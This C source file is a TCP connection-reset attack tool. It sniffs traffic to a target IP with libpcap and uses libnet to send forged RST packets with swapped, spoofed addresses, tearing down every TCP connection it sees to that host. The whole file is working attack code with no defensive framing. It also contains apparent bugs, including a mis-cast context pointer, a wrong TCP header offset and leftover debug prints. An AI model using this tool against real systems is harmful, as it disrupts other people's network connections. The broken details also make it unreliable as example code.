#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <pcap.h>

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
int set_packet_filter(pcap_t *, struct in_addr *);

int main(int argc, char **argv) {

  libnet_t *l;  /* the libnet context */
  char errbuf[LIBNET_ERRBUF_SIZE];
	char *device = NULL;
	pcap_t *pcap_handle;
	const u_char *packet;
	u_int32_t target_ip;

  if ( argc < 2 ) {
    fprintf(stderr,"Usage: %s <target IP>\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  l = libnet_init(LIBNET_RAW4, device, errbuf);
  if ( l == NULL ) {
    fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
    exit(EXIT_FAILURE);
  }

	target_ip = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE);
	if(target_ip == -1){
		fprintf(stderr, "failed to obtain IP: %s\n", errbuf);
    printf("This program must run as root\n");
		exit(EXIT_FAILURE);
	}

	device = pcap_lookupdev(errbuf);
	if(device == NULL){
		fprintf(stderr, "failed to get device: %s\n", errbuf);
		exit(EXIT_FAILURE);
  }

	pcap_handle = pcap_open_live(device, 128, 1, -1, errbuf);
	if(pcap_handle == NULL){
		fprintf(stderr, "failed to start live capture: %s\n", errbuf);
		exit(EXIT_FAILURE);
	}

	libnet_seed_prand(l);

	set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);

	printf("Resetting all TCP connections to %s on %s\n", argv[1], device);
	pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&l);

  libnet_destroy(l);

  return 0;

}

int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip){
	struct bpf_program filter;
	char filter_string[100];

  sprintf(filter_string, "tcp[tcpflags] & tcp-ack != 0 and dst host %s", inet_ntoa(*target_ip));

	printf("DEBUG: filter string is \'%s\'\n", filter_string);
	if(pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1){
		printf("Error compiling filters\n");
		exit(EXIT_FAILURE);
	}

	if(pcap_setfilter(pcap_hdl, &filter) == -1){
		printf("Error setting filter\n");
		exit(EXIT_FAILURE);
	}
}

void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet){
	struct libnet_ipv4_hdr *IPhdr;
	struct libnet_tcp_hdr *TCPhdr;
	int bytes_written;
  libnet_t  *l;
  libnet_ptag_t ip_tag = 0, tcp_tag = 0; //Tags for ip and tcp

  l = (libnet_t *) user_args;

  IPhdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
  TCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	printf("resetting TCP connection from %s:%d ",
		inet_ntoa(IPhdr->ip_src), htons(TCPhdr->th_sport));
	printf("<---> %s:%d\n",inet_ntoa(IPhdr->ip_dst), htons(TCPhdr->th_dport));

	tcp_tag = libnet_build_tcp(htons(TCPhdr->th_dport),  //source TCP port (pretend we are dst)
		htons(TCPhdr->th_sport),								//destination TCP port (send back to src)
		htonl(TCPhdr->th_ack),									//sequence number (use previous ack)
		libnet_get_prand(LIBNET_PRu32),					//acknowledgement number (randomized)
		TH_RST,																	//control flags (RST flag set only)
		libnet_get_prand(LIBNET_PRu16),					//window size (randomized)
		0,																			//Checksum (0 for autofill)
		0,																			//urgent pointer
		LIBNET_TCP_H,				                    //packet header memory
		NULL,																		//payload
		0,																			//payload length
		l,																	    //libnet context
		0);

  printf("UNO");
  if(tcp_tag == -1){
    fprintf(stderr, "Unable to build TCP Header: %s\n", libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }

  ip_tag = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H,		//size of the packet IP header
		0,									            //IP tos
		libnet_get_prand(LIBNET_PRu16), //IP ID (randomized)
		0,															//frag stuff
		libnet_get_prand(LIBNET_PR8),		//TTL (randomized)
		IPPROTO_TCP,										//Transport Protocol
		0,															//Checksum (0 for autofill)
		*((u_int32_t *)&(IPhdr->ip_dst)),  //Source IP (pretend we are dst)
		*((u_int32_t *)&(IPhdr->ip_src)),  //Destination IP (send back to src)
		NULL,														//Payload
		0,															//Payload length
		l,
		0);

  printf("DOS");
  if(ip_tag == -1){
    fprintf(stderr, "Unable to build IP Header: %s\n", libnet_geterror(l));
    libnet_destroy(l);
    exit(EXIT_FAILURE);
  }
	// Writing packets
	bytes_written = libnet_write(l);
	if(bytes_written != -1) printf("%d bytes written.\n", bytes_written);
	else fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));

  libnet_clear_packet(l);

	usleep(5000); //pause slightly
}
